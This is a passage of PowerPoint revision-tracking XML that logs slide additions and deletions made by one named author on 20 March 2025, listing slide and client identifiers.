      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1380305164" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="162578701" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2819027860" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1709445879" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3772480871" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3077237454" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3182079352" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3136726420" sldId="441"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4239463834" sldId="442"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4020129732" sldId="443"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="29321398" sldId="444"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="547814166" sldId="445"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3708179619" sldId="446"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="483222396" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="893476586" sldId="449"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1650498826" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="203229447" sldId="463"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3722655817" sldId="465"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2022026658" sldId="466"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2135918341" sldId="467"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1205810816" sldId="468"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3222348994" sldId="469"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2639562663" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3137595583" sldId="471"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="118295799" sldId="472"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3978145182" sldId="473"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1911490794" sldId="474"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2251333572" sldId="475"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3482510535" sldId="476"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3558611693" sldId="477"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3151704039" sldId="478"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1228791965" sldId="479"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="827267411" sldId="480"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1361679320" sldId="481"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4205689779" sldId="482"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1090567978" sldId="483"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1532593948" sldId="484"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="121719461" sldId="485"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1697829239" sldId="487"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1096562843" sldId="488"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3971291027" sldId="489"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3818375063" sldId="490"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="991312575" sldId="491"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2514893275" sldId="492"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3483062112" sldId="493"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3302575555" sldId="494"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3208410718" sldId="495"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="814342819" sldId="496"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2452342595" sldId="507"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3071100166" sldId="508"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:36.279" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2267150495" sldId="509"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2063936211" sldId="510"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1533819548" sldId="511"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="902064949" sldId="512"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1686661305" sldId="513"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3351605550" sldId="514"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="752675993" sldId="515"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3043064213" sldId="516"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4279718086" sldId="517"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1820281243" sldId="518"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3634168848" sldId="520"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1173785866" sldId="521"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1176863794" sldId="522"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="912083773" sldId="523"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2423877030" sldId="524"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1688261493" sldId="525"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2734443557" sldId="526"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1055750870" sldId="527"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1863952922" sldId="528"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3521681566" sldId="529"/>
        </pc:sldMkLst>
